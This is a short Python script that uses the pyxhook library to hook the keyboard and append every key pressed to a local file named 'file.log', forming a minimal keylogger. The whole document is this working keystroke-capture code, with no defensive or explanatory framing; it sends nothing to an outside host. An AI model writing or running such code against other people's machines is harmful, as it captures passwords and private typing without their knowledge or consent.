import pyxhook

log_file = './file.log'


def on_key_press(event):
    fob = open(log_file, 'a')
    fob.write(event.Key)
    fob.write('\n')


new_hook = pyxhook.HookManager()
new_hook.KeyDown = on_key_press
new_hook.HookKeyboard()
new_hook.start()
